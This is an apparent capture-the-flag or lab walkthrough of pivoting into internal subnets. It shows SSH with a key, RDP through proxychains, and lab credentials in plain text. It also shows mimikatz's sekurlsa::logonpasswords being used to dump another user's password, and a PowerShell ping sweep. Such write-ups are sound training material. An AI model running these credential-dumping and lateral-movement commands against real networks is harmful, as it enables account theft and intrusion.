![[Screenshot 2026-05-22 at 12.44.52.png]]

`ssh using id_rsa` 
![[Screenshot 2026-05-22 at 13.32.50.png]]

we have internal network `172.16.5.15` pivot into it but before that we need to scan the port to make sure we can RDP
![[Screenshot 2026-05-22 at 13.34.24.png]]

dont forget ping sweep to know that which ip is alive ^^ 
![[Screenshot 2026-05-22 at 13.40.15.png]]

now we can rdp into the `mlefay:Plain Human work!` to get the first `flag.txt`
![[Screenshot 2026-05-22 at 13.41.12.png]]
![[Screenshot 2026-05-22 at 13.46.42.png]]

again rdp3 with mimikatz.exe `proxychains4 xfreerdp3 /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /drive:Shared,/usr/share/windows-resources/mimikatz/x64/`
![[Screenshot 2026-05-22 at 13.50.17.png]]

`sekurlsa::logonpasswords` then we got vfrank password `Imply wet Unmasked!`
![[Screenshot 2026-05-22 at 14.14.19.png]]
![[Screenshot 2026-05-22 at 14.23.32.png]]

using `1..254 | ForEach-Object { Test-Connection -ComputerName "172.16.6.$_" -Count 1 -AsJob } | Get-Job | Receive-Job -Wait | Select-Object @{N="IP";E={$_.Address}}, @{N="Alive";E={$_.ResponseTime -ne $null}} | Where-Object {$_.Alive -eq $true}` to know which ip is survive in network

get it `172.16.6.25` lets rdp into it then get the flag

ended !!